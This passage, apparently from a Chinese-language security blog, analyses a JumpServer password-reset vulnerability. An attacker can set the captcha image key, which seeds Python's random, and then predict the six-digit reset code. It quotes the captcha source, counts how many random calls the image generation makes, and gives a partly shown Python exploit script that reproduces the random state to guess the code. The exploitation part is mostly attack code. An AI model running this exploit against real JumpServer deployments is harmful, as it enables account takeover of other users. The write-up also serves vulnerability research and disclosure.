<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">captcha_refresh</span>(request):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Return json with new captcha for ajax refresh request&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;x-requested-with&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;XMLHttpRequest&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> Http404
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    new_key <span style="color:#f92672">=</span> CaptchaStore<span style="color:#f92672">.</span>pick()
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">......</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#a6e22e">@classmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_key</span>(cls, generator<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>        challenge, response <span style="color:#f92672">=</span> captcha_settings<span style="color:#f92672">.</span>get_challenge(generator)()
</span></span><span style="display:flex;"><span>        store <span style="color:#f92672">=</span> cls<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>create(challenge<span style="color:#f92672">=</span>challenge, response<span style="color:#f92672">=</span>response)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> store<span style="color:#f92672">.</span>hashkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@classmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pick</span>(cls):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> captcha_settings<span style="color:#f92672">.</span>CAPTCHA_GET_FROM_POOL:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> cls<span style="color:#f92672">.</span>generate_key()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fallback</span>():
</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Couldn&#39;t get a captcha from pool, generating&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> cls<span style="color:#f92672">.</span>generate_key()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Pick up a random item from pool</span>
</span></span><span style="display:flex;"><span>        minimum_expiration <span style="color:#f92672">=</span> timezone<span style="color:#f92672">.</span>now() <span style="color:#f92672">+</span> datetime<span style="color:#f92672">.</span>timedelta(
</span></span><span style="display:flex;"><span>            minutes<span style="color:#f92672">=</span>int(captcha_settings<span style="color:#f92672">.</span>CAPTCHA_GET_FROM_POOL_TIMEOUT)
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        store <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>            cls<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>filter(expiration__gt<span style="color:#f92672">=</span>minimum_expiration)<span style="color:#f92672">.</span>order_by(<span style="color:#e6db74">&#34;?&#34;</span>)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (store <span style="color:#f92672">and</span> store<span style="color:#f92672">.</span>hashkey) <span style="color:#f92672">or</span> fallback()
</span></span></code></pre></div><p>CAPTCHA_GET_FROM_POOL默认为False，pick通过get_chanllenge查找生成chal的函数并调用</p>
<p>jumpserver默认有如下设置:</p>
<pre tabindex="0"><code>CAPTCHA_IMAGE_SIZE = (180, 38)
CAPTCHA_FOREGROUND_COLOR = &#39;#001100&#39;
CAPTCHA_NOISE_FUNCTIONS = (&#39;captcha.helpers.noise_dots&#39;,)
CAPTCHA_CHALLENGE_FUNCT = &#39;captcha.helpers.math_challenge&#39;
</code></pre><p>math_challenge用于生成简单的数学计算题。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">math_challenge</span>():
</span></span><span style="display:flex;"><span>    operators <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>)
</span></span><span style="display:flex;"><span>    operands <span style="color:#f92672">=</span> (random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>), random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>))
</span></span><span style="display:flex;"><span>    operator <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>choice(operators)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> operands[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;</span> operands[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">==</span> operator:
</span></span><span style="display:flex;"><span>        operands <span style="color:#f92672">=</span> (operands[<span style="color:#ae81ff">1</span>], operands[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    challenge <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d%s%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (operands[<span style="color:#ae81ff">0</span>], operator, operands[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">=&#34;</span><span style="color:#f92672">.</span>format(challenge<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;*&#34;</span>, settings<span style="color:#f92672">.</span>CAPTCHA_MATH_CHALLENGE_OPERATOR)),
</span></span><span style="display:flex;"><span>        str(eval(challenge)),
</span></span><span style="display:flex;"><span>    )
</span></span></code></pre></div><p>验证码刷新流程为：</p>
<ol>
<li>通过math_challenge生成简单算术题</li>
<li>将题目和答案保存</li>
<li>通过store.hashkey生成题目hash，将hash作为key返回</li>
</ol>
<p>后续可根据此key获取图片。由<code>captcha_image</code>函数生成图片。</p>
<p>captcha_image代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">captcha_image</span>(request, key, scale<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> scale <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> settings<span style="color:#f92672">.</span>CAPTCHA_2X_IMAGE:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> Http404
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        store <span style="color:#f92672">=</span> CaptchaStore<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(hashkey<span style="color:#f92672">=</span>key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> CaptchaStore<span style="color:#f92672">.</span>DoesNotExist:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># HTTP 410 Gone status so that crawlers don&#39;t index these expired urls.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> HttpResponse(status<span style="color:#f92672">=</span><span style="color:#ae81ff">410</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(key)  <span style="color:#75715e"># Do not generate different images for the same key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    text <span style="color:#f92672">=</span> store<span style="color:#f92672">.</span>challenge
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(settings<span style="color:#f92672">.</span>CAPTCHA_FONT_PATH, str):
</span></span><span style="display:flex;"><span>        fontpath <span style="color:#f92672">=</span> settings<span style="color:#f92672">.</span>CAPTCHA_FONT_PATH
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> isinstance(settings<span style="color:#f92672">.</span>CAPTCHA_FONT_PATH, (list, tuple)):
</span></span><span style="display:flex;"><span>        fontpath <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>choice(settings<span style="color:#f92672">.</span>CAPTCHA_FONT_PATH)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> ImproperlyConfigured(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;settings.CAPTCHA_FONT_PATH needs to be a path to a font or list of paths to fonts&#34;</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> fontpath<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;ttf&#34;</span>):
</span></span><span style="display:flex;"><span>        font <span style="color:#f92672">=</span> ImageFont<span style="color:#f92672">.</span>truetype(fontpath, settings<span style="color:#f92672">.</span>CAPTCHA_FONT_SIZE <span style="color:#f92672">*</span> scale)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        font <span style="color:#f92672">=</span> ImageFont<span style="color:#f92672">.</span>load(fontpath)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> settings<span style="color:#f92672">.</span>CAPTCHA_IMAGE_SIZE:
</span></span><span style="display:flex;"><span>        size <span style="color:#f92672">=</span> settings<span style="color:#f92672">.</span>CAPTCHA_IMAGE_SIZE
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        size <span style="color:#f92672">=</span> getsize(font, text)
</span></span><span style="display:flex;"><span>        size <span style="color:#f92672">=</span> (size[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, int(size[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1.4</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    image <span style="color:#f92672">=</span> makeimg(size)
</span></span><span style="display:flex;"><span>    xpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    charlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> text:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> settings<span style="color:#f92672">.</span>CAPTCHA_PUNCTUATION <span style="color:#f92672">and</span> len(charlist) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            charlist[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            charlist<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> charlist:
</span></span><span style="display:flex;"><span>        fgimage <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;RGB&#34;</span>, size, settings<span style="color:#f92672">.</span>CAPTCHA_FOREGROUND_COLOR)
</span></span><span style="display:flex;"><span>        charimage <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;L&#34;</span>, getsize(font, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> char), <span style="color:#e6db74">&#34;#000000&#34;</span>)
</span></span><span style="display:flex;"><span>        chardraw <span style="color:#f92672">=</span> ImageDraw<span style="color:#f92672">.</span>Draw(charimage)
</span></span><span style="display:flex;"><span>        chardraw<span style="color:#f92672">.</span>text((<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>), <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &#34;</span> <span style="color:#f92672">%</span> char, font<span style="color:#f92672">=</span>font, fill<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#ffffff&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> settings<span style="color:#f92672">.</span>CAPTCHA_LETTER_ROTATION:
</span></span><span style="display:flex;"><span>            charimage <span style="color:#f92672">=</span> charimage<span style="color:#f92672">.</span>rotate(
</span></span><span style="display:flex;"><span>                random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>settings<span style="color:#f92672">.</span>CAPTCHA_LETTER_ROTATION),
</span></span><span style="display:flex;"><span>                expand<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>                resample<span style="color:#f92672">=</span>Image<span style="color:#f92672">.</span>BICUBIC,
</span></span><span style="display:flex;"><span>            )
</span></span><span style="display:flex;"><span>        charimage <span style="color:#f92672">=</span> charimage<span style="color:#f92672">.</span>crop(charimage<span style="color:#f92672">.</span>getbbox())
</span></span><span style="display:flex;"><span>        maskimage <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;L&#34;</span>, size)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">......</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> settings<span style="color:#f92672">.</span>noise_functions():
</span></span><span style="display:flex;"><span>        draw <span style="color:#f92672">=</span> f(draw, image)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> settings<span style="color:#f92672">.</span>filter_functions():
</span></span><span style="display:flex;"><span>        image <span style="color:#f92672">=</span> f(image)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">......</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
</span></span></code></pre></div><p>先将key作为seed传入，后续需要计算random操作调用了多少次，姑且称其为偏移吧。</p>
<p><code>settings.CAPTCHA_FONT_PATH</code>默认有值，不会调用<code>random.choice</code></p>
<p>之后会对text也就是算术题进行处理，会调用<code>random.randrange(*settings.CAPTCHA_LETTER_ROTATION)</code>，调用次数不确定。</p>
<p>在<code>noise_functions()</code>中jumpserver设置为了<code>captcha.helpers.noise_arcs</code>和<code>captcha.helpers.noise_dots</code>，其中<code>captcha.helpers.noise_dots</code>会调用random。代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">noise_dots</span>(draw, image):
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>size
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> range(int(size[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> size[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.1</span>)):
</span></span><span style="display:flex;"><span>        draw<span style="color:#f92672">.</span>point(
</span></span><span style="display:flex;"><span>            (random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">0</span>]), random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">1</span>])),
</span></span><span style="display:flex;"><span>            fill<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>CAPTCHA_FOREGROUND_COLOR,
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> draw
</span></span></code></pre></div><p>图片大小决定seed的偏移。而jumpserver设置了默认图片大小，就是上面提到的<code>CAPTCHA_IMAGE_SIZE = (180, 38)</code>，在<code>captcha_image</code>函数中读取并赋值。</p>
<h2 id="密码重置验证码逻辑">密码重置验证码逻辑<a hidden class="anchor" aria-hidden="true" href="#密码重置验证码逻辑">#</a></h2>
<p><code>UserResetPasswordSendCodeApi</code>类定义了验证码逻辑：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>GET<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>userinfo <span style="color:#f92672">=</span> cache<span style="color:#f92672">.</span>get(token)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> userinfo:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> HttpResponseRedirect(reverse(<span style="color:#e6db74">&#39;authentication:forgot-previewing&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>serializer <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_serializer(data<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>data)
</span></span><span style="display:flex;"><span>serializer<span style="color:#f92672">.</span>is_valid(raise_exception<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> userinfo<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>form_type <span style="color:#f92672">=</span> serializer<span style="color:#f92672">.</span>validated_data[<span style="color:#e6db74">&#39;form_type&#39;</span>]
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">6</span>, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">......</span>
</span></span></code></pre></div><h1 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h1>
<p>想要预测验证码达成以下条件：</p>
<ol>
<li>控制seed</li>
<li>可控seed的偏移</li>
</ol>
<h2 id="控制seed">控制seed<a hidden class="anchor" aria-hidden="true" href="#控制seed">#</a></h2>
<p>通过路由<code>/core/auth/captcha/image/{seed}/</code>即可设置seed。需要注意：</p>
<p>生成图片时会检查此key是否通过refresh生成：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    store <span style="color:#f92672">=</span> CaptchaStore<span style="color:#f92672">.</span>objects<span style="color:#f92672">.</span>get(hashkey<span style="color:#f92672">=</span>key)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> CaptchaStore<span style="color:#f92672">.</span>DoesNotExist:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># HTTP 410 Gone status so that crawlers don&#39;t index these expired urls.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> HttpResponse(status<span style="color:#f92672">=</span><span style="color:#ae81ff">410</span>)
</span></span></code></pre></div><p>当一个验证码被使用后，对应的key会被删除，如果再次尝试设置seed为此key，会返回410错误，所以key不能复用。</p>
<p>还有就是jumpserver会有多个进程进行监听，所以需要多次发包设置seed才能使所有进程的seed都被控制，提高成功率。</p>
<h2 id="计算random调用次数">计算random调用次数<a hidden class="anchor" aria-hidden="true" href="#计算random调用次数">#</a></h2>
<p><code>noise_dots</code>计算噪点以及最终生成code时调用次数都是固定的。不确定的地方是对challenge处理时调用次数会根据challenge内容决定。</p>
<p>尝试枚举所有可能：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>lens <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">11</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>]:
</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}{}{}</span><span style="color:#e6db74">=&#39;</span><span style="color:#f92672">.</span>format(str(i), p, str(l))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            charlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> text:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> char <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;_</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;,.;:-&#34;</span> <span style="color:#f92672">and</span> len(charlist) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                    charlist[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    charlist<span style="color:#f92672">.</span>append(char)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> charlist:
</span></span><span style="display:flex;"><span>                sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> sum <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> lens:
</span></span><span style="display:flex;"><span>                lens<span style="color:#f92672">.</span>append(sum)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lens<span style="color:#f92672">.</span>sort()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(lens)  <span style="color:#75715e"># [3, 4, 5, 6]</span>
</span></span></code></pre></div><p>计算4次的概率最大。</p>
<h2 id="半自动利用">半自动利用<a hidden class="anchor" aria-hidden="true" href="#半自动利用">#</a></h2>
<p><strong>利用流程</strong>：</p>
<ol>
<li>浏览器进入发送验证码页面</li>
<li>在发送验证码之前运行脚本预测验证码</li>
<li>发送验证码</li>
</ol>
<p><strong>原理</strong>：先设置seed，然后用gen_img_flow模拟seed偏移。因为次数为4的概率最大，所以固定为4。此脚本有概率失败大概为<code>30%</code></p>
<p>脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>string_punctuation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_~&#39;</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_img_flow</span>(n):
</span></span><span style="display:flex;"><span>    CAPTCHA_LETTER_ROTATION <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">35</span>)
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> (<span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">38</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randrange(<span style="color:#f92672">*</span>CAPTCHA_LETTER_ROTATION)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> range(int(size[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> size[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.1</span>)):
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>        random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, size[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(length: int, lower<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, upper<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, digit<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, special_char<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    args_names <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;lower&#39;</span>, <span style="color:#e6db74">&#39;upper&#39;</span>, <span style="color:#e6db74">&#39;digit&#39;</span>, <span style="color:#e6db74">&#39;special_char&#39;</span>]
</span></span><span style="display:flex;"><span>    args_values <span style="color:#f92672">=</span> [lower, upper, digit, special_char]
</span></span><span style="display:flex;"><span>    args_string <span style="color:#f92672">=</span> [string<span style="color:#f92672">.</span>ascii_lowercase, string<span style="color:#f92672">.</span>ascii_uppercase, string<span style="color:#f92672">.</span>digits, string_punctuation]
</span></span><span style="display:flex;"><span>    args_string_map <span style="color:#f92672">=</span> dict(zip(args_names, args_string))
</span></span><span style="display:flex;"><span>    kwargs <span style="color:#f92672">=</span> dict(zip(args_names, args_values))
</span></span><span style="display:flex;"><span>    kwargs_keys <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>keys())
</span></span><span style="display:flex;"><span>    kwargs_values <span style="color:#f92672">=</span> list(kwargs<span style="color:#f92672">.</span>values())
</span></span><span style="display:flex;"><span>    args_true_count <span style="color:#f92672">=</span> len([i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> kwargs_values <span style="color:#66d9ef">if</span> i])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> any(kwargs_values), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Parameters </span><span style="color:#e6db74">{</span>kwargs_keys<span style="color:#e6db74">}</span><span style="color:#e6db74"> must have at least one `True`&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">assert</span> length <span style="color:#f92672">&gt;=</span> args_true_count, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Expected length &gt;= </span><span style="color:#e6db74">{</span>args_true_count<span style="color:#e6db74">}</span><span style="color:#e6db74">, bug got </span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    can_startswith_special_char <span style="color:#f92672">=</span> args_true_count <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> special_char
</span></span><span style="display:flex;"><span>
